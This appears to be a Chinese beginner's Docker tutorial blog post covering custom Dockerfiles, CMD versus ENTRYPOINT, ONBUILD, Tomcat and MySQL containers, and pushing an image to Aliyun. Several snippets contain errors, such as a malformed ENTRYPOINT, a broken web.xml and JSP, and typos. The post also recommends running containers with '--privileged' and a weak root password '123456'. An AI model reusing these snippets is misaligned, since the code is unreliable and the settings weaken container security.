\\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L54-L56\n\t&amp;&amp; dpkg-divert --local --rename --add /sbin/initctl \\\n\t&amp;&amp; cp -a /usr/sbin/policy-rc.d /sbin/initctl \\\n\t&amp;&amp; sed -i 's/^exit.*/exit 0/' /sbin/initctl \\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L71-L78\n\t&amp;&amp; echo 'force-unsafe-io' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L85-L105\n\t&amp;&amp; echo 'DPkg::Post-Invoke &#123; \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; &#125;;' > /etc/apt/apt.conf.d/docker-clean \\\n\t&amp;&amp; echo 'APT::Update::Post-Invoke &#123; \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; &#125;;' >> /etc/apt/apt.conf.d/docker-clean \\\n\t&amp;&amp; echo 'Dir::Cache::pkgcache \"\"; Dir::Cache::srcpkgcache \"\";' >> /etc/apt/apt.conf.d/docker-clean \\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L109-L115\n\t&amp;&amp; echo 'Acquire::Languages \"none\";' > /etc/apt/apt.conf.d/docker-no-languages \\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L118-L130\n\t&amp;&amp; echo 'Acquire::GzipIndexes \"true\"; Acquire::CompressionTypes::Order:: \"gz\";' > /etc/apt/apt.conf.d/docker-gzip-indexes \\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L134-L151\n\t&amp;&amp; echo 'Apt::AutoRemove::SuggestsImportant \"false\";' > /etc/apt/apt.conf.d/docker-autoremove-suggests\n\n# delete all the apt list files since they're big and get stale quickly\nRUN rm -rf /var/lib/apt/lists/*\n# this forces \"apt-get update\" in dependent images, which is also good\n# (see also https://bugs.launchpad.net/cloud-images/+bug/1699913)\n\n# make systemd-detect-virt return \"docker\"\n# See: https://github.com/systemd/systemd/blob/aa0c34279ee40bce2f9681b496922dedbadfca19/src/basic/virt.c#L434\nRUN mkdir -p /run/systemd &amp;&amp; echo 'docker' > /run/systemd/container\n\nCMD [\"/bin/bash\"]\ndockerfile案例自定义镜像下面以centos为例docker安装的精简版的centos，其自身只保留了内核，对于一些系统认为不是很重要的东西被舍弃掉了，如下图所示\n我们在进入centos后，发现vim无法使用，而且ifconfig也无法使用，且默认路径是/，那如果我们想使用ifconfig、自定义根目录，该如何做呢，这时候我们可以自己做一个镜像，话不多说，dockerfile如下\nFROM centos  //来源于centos\nMAINTAINER quan9i&lt;quan9i@qq.com> //作者是quan9i，后面是邮箱\n\nENV MYPATH /usr/local  //配置环境变量\nWORKDIR $MYPATH //指定默认路径\n\nRUN yum -y  install vim  //安装vim的命令\nRUN yum -y  install net-tools //安装 \n\nEXPOSE 80 //暴露端口为80\nCMD echo $MYPATH \nCMD echo \"success------ok\"\nCMD /bin/bash\n此时保存并退出，然后开始构建镜像\ndocker build -f /mydocker/Dockerfile2 -t quan9i/centos . \n完成后run容器进入即可发现vim和ifconfig可以使用\nCMD和ENTRYPOINT的区别（实例）为了演示两者的区别，接下来以tomcat和centos演示一下：查看一下tomact的dockerfile（重点看的是最后CMD，前面太多，不进行全部复制）\nENV CATALINA_HOME /usr/local/tomcat //配置环境\nENV PATH $CATALINA_HOME/bin:$PATH //默认路径\nRUN mkdir -p \"$CATALINA_HOME\"\nWORKDIR $CATALINA_HOME\n\nEXPOSE 8080\nCMD [\"catalina.sh\", \"run\"] //启动容器的命令\n\n我们在启动tomcat时，在后面追加一个ls-l命令，代码如下\ndocker run -it -p 8888:8080 tomcat ls -l   \n执行结果根据webapps、work这些可以判断是tomcat里的，此时查看运行容器发现没有容器在运行，说明之前的CMD命令被ls-l这条命令替代了，没有发挥其作用此时呢，就相当于上述的dockerfile是这样的\nENV CATALINA_HOME /usr/local/tomcat //配置环境\nENV PATH $CATALINA_HOME/bin:$PATH //默认路径\nRUN mkdir -p \"$CATALINA_HOME\"\nWORKDIR $CATALINA_HOME\n\nEXPOSE 8080\nCMD [\"catalina.sh\", \"run\"] //启动容器的命令\nCMD ls-l\n此时可见CMD的命令会被覆盖\n此时再创建简单的CMD版查询ip和ENTRYPOINT版查询ip观察区别首先创建dockerfile文件，编辑内容如下\nFROM centos //来自于centos\nRUN yum install -y curl  //用yum安装curl\nCMD [ \"curl\", \"-s\" ,\"http://ip.cn\"] // 执行查询ip的命令\n此时开始构建镜像\n docker build -f /mydocker/Dockerfile3 -t myip .\n //-f 后加路径\n// -t 命名\n此时运行容器\n就会执行查询ip的命令但是此时没有显示http报文头信息，如果想要显示头部段信息的话，需要加上-i再次运行并在尾部加上-i，代码\ndocker run myip -i\n执行结果如下发现报错了，这是因为cmd是覆盖，后面的-i替换了之前的cmd命令 &quot;curl&quot;, &quot;-s&quot; ,&quot;http://ip.cn&quot;此时的dockerfile相当于\nFROM centos //来自于centos\nRUN yum install -y curl  //用yum安装curl\nCMD [ \"curl\", \"-s\" ,\"http://ip.cn\"] // 执行查询ip的命令\nCMD  -i\n这是CMD版本的查询ip，接下来创建ENTRYPOINT的dockerfile内容如下\nFROM centos //来自于centos\nRUN yum install -y curl  //用yum安装curl\nENTRYPOINT[ \"curl\", \"-s\" ,\"http://ip.cn\"] // 执行查询ip的命令\n然后开始构建\ndocker build -f /mydocker/Dockerfile4 -t myip2 .     \n运行容器发现都能正常执行，原有的没有受到影响，且可以正常使用-i此时的dockerfile文件就相当于CMD版本的\nFROM centos \nRUN yum install -y curl  \nENTRYPOINT[ \"curl\", \"-s\" ,-i \"http://ip.cn\"]\n由此可见CMD和ENTRYPOINT的区别在于前者是覆盖，后者是追加\nONBULID命令案例温习定义\nONBULID xx //当构建一个被继承的dockerfile时运行命令，父镜像在被子镜像继承后其onbulid被触发\n\n首先创建一个父dockerfile文件\nFROM centos\nRUN yum install -y curl\nCMD [ \"curl\", \"-s\" ,\"http://ip.cn\"]\nONBUILD RUN echo \"father onbuild------886\"\n\n构建父镜像\ndocker build -f /mydocker/Dockerfile4 -t myip_father . \n此时docker images可以发现镜像已经搭建完成然后此时再新建一个dockerfile文件，文件内容如下\nFROM myip_father //不再基于centos，而基于刚刚创建的镜像\nRUN yum install -y curl \nCMD [ \"curl\", \"-s\" ,\"http://ip.cn\"]\n此时构建镜像\ndocker build -f /mydocker/Dockerfile5 -t myip_son .  \n红色部分就是子类在执行时，父类的onbuild被触发\n自定义centos9首先创建文件夹，代码如下\nmkdir -p /zzyyuse/mydockerfile/tomcat9\nmkdir小科普\n-p 递归创建出具有嵌套叠层关系的文件目录。\n[root@linuxprobe linuxprobe]# mkdir -p a/b/c/d/e\n[root@linuxprobe linuxprobe]# cd a\n[root@linuxprobe a]# cd b\n[root@linuxprobe b]#\n此时cd到当前路径，创建c.txt文件\ncd  /zzyyuse/mydockerfile/tomcat9\ntouch c.txt\n再将文件拷贝到当前路径\ncp opt/apache-tomcat-9.0.8.tar.gz  /zzyyuse/mydockerfile/tomcat9\n//将opt文件夹中的apache文件复制到当前文件夹中\ncp java/jdk-8u171-linux-x64.tar.gz  /zzyyuse/mydockerfile/tomcat9\\\n//将java文件夹中的jdk文件复制到当前文件夹中\n\n此时再创建dockerfile文件，编辑内容如下\nFROM centos //基于centos\nMAINTTAINER zzyy&lt;zzyybs@126.com>//维护者名字和邮箱\nCOPY c.txt /usr/local/cincontainer.txt//复制文件并重命名\nADD jdk-8u171-linux-x64.tar.gz  /usr/local/\nADD apache-tomcat-9.0.8.tar.gz  /usr/local/\n//把java和tomcat添加到容器中\nRUN yum -y install vim//安装vim编辑器\nENV MYPATH /us/local //配置环境变量\nWORKDIR $MYPATH //默认当前路径\nENV  CLASSPATH $JAVA_HOME/lib/dt,jar:$JAVA_HOME/lib/tools.jar\nENV CATALINA_HOME /usr/local/apache-tomcat-9.0.8\nENV CATALINA_BASE /usr/local/apache-tomcat-9.0.8\nENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin\n//配置java与tomcat环境变量\nEXPOSE 8080 //容器运行时监听的端口\n#ENTRYPOINT [\"usr/local/apache-tomcat-9.0.8/bin/startup.sh\"]\n#CMD [\"/usr/local/apache-tomcat-9.0.8/bin/catalina.sh\",\"run\"]\nCMD usr/local/apache-tomcat-9.0.8/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.8/bin/logs/catalina.out\n//追加读日志\n此时开始构建镜像\ndocker bulid -t zzyytomcat-9 .\n//此时没写-f ，在本目录下时，不写默认读取的就是此dockerfile\n安装完成后docker images查看然后运行容器，代码如下\ndocker run -d -p 9080:8080 --name myt9\n//-d 守护式进程（后台运行） -p 端口映射 --name 容器命名\n-v /zzyyuse/mydockerfile/tomcat9/test: /usr/local/apache-tomcat-9.0.8/webapps/test\n-v /zzyyuse/mydockerfile/tomcat9/tomcat9logs/ : /usr/local/apache-tomcat-9.0.8/logs\n//-v 添加数据卷  ，后面文件会同步到前面\n--privilegd=true\n//偶尔会出现报错，这个命令可以解决报错问题\nzzyytomcat9\n//镜像名\n再docker ps如下图所示发现已经运行，再进行验证，在虚拟机中访问localhost:9080\n构建成功，我们是以后台进程式的方法启动的容器，那如果想要进行ls命令该怎么做呢？答案是利用exec，构造代码如下\ndocker exec 容器id ls -l\n执行结果如下此时如果想要将web服务test发布的话，该如何操作呢首先进入test文件下，再创建WEB-INF文件夹然后在其内创建并编辑web.xml文件，内容如下\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\t&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\t\n\txmlns=\"https://java.sun.com/xml/javase\"\n\txsi:schemal_ocation=\"http://java.sun.com/xml/ns.javaee http: //java.sun.com/xml/ns/javaee/wev-app_2_5.xsd\"\n\tid=\"WebApp_ID version=\"2.5\">\n\n\t&lt;display-name>test&lt;/display-name>\n\n&lt;web-app>\n此时呢，再创建并编辑a.jsp文件，其内容如下\n&lt;%@ page language=\"java\" contentTYPE=\"text/html\";charset=\"UTF-8\" pageEncoding=\"UTF-8\"%>\n&lt;! DOCTYPE html PUBLIC \"-//w3c//DTD html 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n&lt;html>\n    &lt;head>\n   \t\t\t&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\">\n           \t&lt;title>Insert title here&lt;/title>\n    &lt;/head>\n    &lt;body>\n    ----------welcome-----------\n           &lt;%= \"i am in docker tomcat self\"%>\n          &lt;br>\n          &lt;br>\n          &lt;%system.out.println(\"==========docker tomcat self\");%>\n    &lt;/body>\n&lt;/html>\n重启容器，然后在虚拟机中访问\n此时你再在虚拟机的内容里多两个换行符（&lt; br&gt;）会同步到centos中，那就会在访问时生效此时再查看catlina.out文件，代码如下\ncat catlina.out\n执行结果如下我访问了三次，后台日志记录了三次\ndocker安装mysqldocker安装mysql首先呢搜索mysql，代码如下\ndocker search mysql\n执行结果如下此时我们如果想要下载5.6的版本该怎么办呢，后面加上版本号即可,代码如下\ndocker pull mysql:5.6\n\n下载完成，接下来运行容器，代码如下\ndocker run -p  1111:3306  --name mysql\n//虚拟机的1111端口映射mysql的3306端口 ，给容器命名为mysql\n-v /zzyyuse/mysql/conf:/etc/mysql/conf.d\n-v /zzyyuse/mysql/logs:/logs\n-v /zzyyuse/mysql/data:/var/lib/mysql\n//添加三个数据卷\n-e MYSQL_ROOT_PASSWORD=123456\n//初始化mysql密码为123456\n-d \n//以守护式进程运行（后台运行）\nmysql:5.6\n//镜像名称\n执行结果如下此时该如何启动容器，那当然是exec，代码如下\ndocker exec -it 8e37864ac5d1 /bin/bash\n此时呢，通过密码进入mysql，代码如下\nmysql -u root -p\t\n注:密码默认是不回显的，直接输入即可此时先新建一个数据库\ncreate database db01;\n建表\ncreate table t_book(id int not null primary key,bookName varchar(20) );\n插入字段\ninsert into t_book values(1,'java');\n此时呢，我们尝试在外部进行连接（虚拟机ip可通过 ifconfig指令查看，显示的docker中inet后的数字就是ip）连接后，可以发现刚刚编写的内容此时你把java改成tomcat再从mysql里面看完成了外部机器连接mysql此时想要备份的话，如下操作即可\ndocker exec 容器id sh -c 'exec mysqldump --all-databases -u root -p\"123456\" '>/zzyyuse/all-database.sql\n//含义是让全部数据库以root名字和123456为密码登录，然后将数据同步到文件夹zzyyuse下的all-database.sql文件中\n此时切换到这个目录下\ncd /zzyyuse/\n\n查看文件\ncat  all-database.sql\n\n数据已全部备份到此文件中\n本地镜像发布到阿里云上首先呢，我们复习一下commit，使用commit构建一个镜像\ndocker commit -a zzyy -m \"new centos with xx and xx\" bbb491fa56fc  mycentos \n//-a 描述作者信息 -m 描述大致信息\n\n执行结果如下此时打开阿里云，在里面搜索容器镜像服务然后创建个人版，然后开始创建个人仓库再选本地仓库此时给出了以下几个代码按1、3步骤操作即可，但是第一个命令执行时会报错，如下图这是因为没有设置固定密码的问题，找到刚刚的个人版那里，点击进去，选最下方的访问凭证，设置固定密码即可然后最终设置完毕后在阿里云镜像仓库中就可以找到自己搭建的镜像啦，docker初学就到这里结束，本人只是小白，有问题还请各位大佬多多指教\n","slug":"docker初学小结","date":"2022-02-10T18:17:28.000Z","categories_index":"语言学习","tags_index":"docker","author_index":"quan9i"}]